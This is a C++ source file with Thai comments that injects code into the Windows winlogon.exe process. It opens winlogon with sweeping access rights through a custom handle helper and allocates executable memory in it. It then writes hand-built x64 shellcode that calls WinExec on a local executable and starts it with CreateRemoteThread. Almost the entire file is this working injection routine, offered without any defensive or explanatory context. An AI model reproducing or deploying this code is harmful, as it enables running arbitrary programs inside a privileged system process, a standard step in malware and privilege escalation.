
void CallRemoteWinExec(HANDLE hProcess, FARPROC remoteWinExec) {
	// คำสั่งที่จะรันในโปรเซส target
	const char* command = "D:\\PSTool\\ChackProcess.exe";
	SIZE_T commandLen = strlen(command) + 1;

	// กำหนดขนาด shellcode (คำนวณจากคำสั่งด้านบน)
	// push rdi         : 1 byte
	// sub rsp,0x20     : 4 bytes (48 83 EC 20)
	// mov edx,5        : 5 bytes (BA 05 00 00 00)
	// mov rcx,imm64    : 10 bytes (48 B9 + 8 bytes)
	// mov rax,imm64    : 10 bytes (48 B8 + 8 bytes)
	// call rax         : 2 bytes (FF D0)
	// add rsp,0x20     : 4 bytes (48 83 C4 20)
	// pop rdi          : 1 byte  (5F)
	// ret              : 1 byte  (C3)
	const SIZE_T shellcodeSize = 38;
	SIZE_T totalSize = shellcodeSize + commandLen;

	// จัดสรร memory ในโปรเซส target สำหรับ shellcode + command string
	LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory) {
		std::cerr << "VirtualAllocEx ล้มเหลว: " << GetLastError() << "\n";
		return;
	}
	// ที่อยู่สำหรับ command string อยู่ถัดจาก shellcode
	LPVOID remoteCommandAddr = (LPBYTE)remoteMemory + shellcodeSize;

	// สร้าง buffer สำหรับ shellcode
	unsigned char shellcode[shellcodeSize];
	int offset = 0;

	// 1. push rdi
	shellcode[offset++] = 0x57;

	// 2. sub rsp,0x20   --> 48 83 EC 20
	shellcode[offset++] = 0x48;
	shellcode[offset++] = 0x83;
	shellcode[offset++] = 0xEC;
	shellcode[offset++] = 0x20;

	// 3. mov edx,5     --> BA 05 00 00 00
	shellcode[offset++] = 0xBA;
	shellcode[offset++] = 0x05;
	shellcode[offset++] = 0x00;
	shellcode[offset++] = 0x00;
	shellcode[offset++] = 0x00;

	// 4. mov rcx, <command address>  --> 48 B9 [imm64]
	shellcode[offset++] = 0x48;
	shellcode[offset++] = 0xB9;
	*((uint64_t*)(shellcode + offset)) = (uint64_t)remoteCommandAddr;
	offset += 8;

	// 5. mov rax, <remote WinExec address>  --> 48 B8 [imm64]
	shellcode[offset++] = 0x48;
	shellcode[offset++] = 0xB8;
	*((uint64_t*)(shellcode + offset)) = (uint64_t)remoteWinExec;
	offset += 8;

	// 6. call rax   --> FF D0
	shellcode[offset++] = 0xFF;
	shellcode[offset++] = 0xD0;

	// 7. add rsp,0x20  --> 48 83 C4 20
	shellcode[offset++] = 0x48;
	shellcode[offset++] = 0x83;
	shellcode[offset++] = 0xC4;
	shellcode[offset++] = 0x20;

	// 8. pop rdi   --> 5F
	shellcode[offset++] = 0x5F;

	// 9. ret   --> C3
	shellcode[offset++] = 0xC3;

	// เขียน shellcode ลงใน memory ของโปรเซส target
	if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcodeSize, NULL)) {
		std::cerr << "WriteProcessMemory shellcode ล้มเหลว: " << GetLastError() << "\n";
		VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
		return;
	}
	// เขียน command string ลงใน memory หลัง shellcode
	if (!WriteProcessMemory(hProcess, remoteCommandAddr, command, commandLen, NULL)) {
		std::cerr << "WriteProcessMemory command string ล้มเหลว: " << GetLastError() << "\n";
		VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
		return;
	}

	// สร้าง remote thread เพื่อเรียก shellcodeในโปรเซส target
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
	if (!hThread) {
		std::cerr << "CreateRemoteThread ล้มเหลว: " << GetLastError() << "\n";
		VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
		return;
	}

	// รอให้ thread ทำงานเสร็จสิ้น (หรือจะไม่รอก็ได้)
	WaitForSingleObject(hThread, INFINITE);

	// ทำความสะอาด memory ที่จัดสรรและ handle ที่ใช้
	VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
	CloseHandle(hThread);

	std::cout << "เรียกใช้ WinExec ในโปรเซส target เรียบร้อยแล้ว" << std::endl;
}

void RunChackprocess() {

	uint32_t Pidwinlogon = GetPID(L"winlogon.exe"); // Getpid "winlogon.exe"
	printf("winlogon pid %d.\n", Pidwinlogon);
	HANDLE   Hwinlogon = useSet->GetHusermode(Pidwinlogon, Pidwinlogon, Ps_Process_Type, Zw_Current_Process, PROCESS_VM_READ |
		PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME | PROCESS_TERMINATE
		| PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION
		| PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS | PROCESS_SET_INFORMATION
		| PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_SET_LIMITED_INFORMATION, Hwinlogon);

	printf("hProcEx: 0x%d\n", Hwinlogon);  // ตรวจสอบค่า hProcessEx
	printf("phProcEx: 0x%p\n", Pidwinlogon);  // ตรวจสอบค่า hProcessEx

	ULONG bufferLength = 0;
	NTSTATUS status = Api::Dynamic::CALLNt_QueryObjectPtr(Hwinlogon, Memory_BasicInformation, nullptr, 0, &bufferLength);
	if (status != STATUS_INFO_LENGTH_MISMATCH) {
		std::cerr << "   failed with status: " << status << "\n";


	}


	// ตัวอย่างการดึงโมดูลทั้งหมดภายใน process
	HMODULE hMods[1024];
	DWORD cbNeeded = 0;
	if (!EnumProcessModules(Hwinlogon, hMods, sizeof(hMods), &cbNeeded))
	{
		std::cerr << "EnumProcessModules failed.\n";
		// จัดการ error ตามความเหมาะสม...
	}
	else
	{
		// ตัวอย่าง: แสดงจำนวนโมดูลที่ถูกโหลด
		size_t moduleCount = cbNeeded / sizeof(HMODULE);
		std::cout << "Loaded Modules: " << moduleCount << "\n";
	}
	size_t modCount = cbNeeded / sizeof(HMODULE);


	for (size_t i = 0; i < modCount; i++)
	{
		char modName[MAX_PATH];
		if (!GetModuleFileNameExA(Hwinlogon, hMods[i], modName, sizeof(modName))) {
			continue;
		}

		const char* baseName = strrchr(modName, '\\');
		baseName = (baseName) ? baseName + 1 : modName;

		MODULEINFO mInfo{};
		if (GetModuleInformation(Hwinlogon, hMods[i], &mInfo, sizeof(mInfo))) {
			HMODULE Kernelbase = GetRemoteModuleHandle(Hwinlogon, "kernel32.dll");

			if (_stricmp(baseName, "kernel32.dll") == 0) {

				uintptr_t dllBase = reinterpret_cast<uintptr_t>(mInfo.lpBaseOfDll);
				size_t dllSize = static_cast<size_t>(mInfo.SizeOfImage);

				FARPROC localWinExec = GetFunctionAddresswinlogon(hMods[i], "WinExec"); //LoadLibraryA
				// FARPROC loaclCallWinExec = GetFunctionAddresswinlogon(GetRemoteModuleHandle(HprocessinjectCodr, "kernel32.dll"), "WinExec");

				CallRemoteWinExec(Hwinlogon, localWinExec);
				std::cout << baseName << " WinExec local: 0x" << localWinExec << std::endl;
			}


		}


	}

	CloseHandle(Hwinlogon);


}
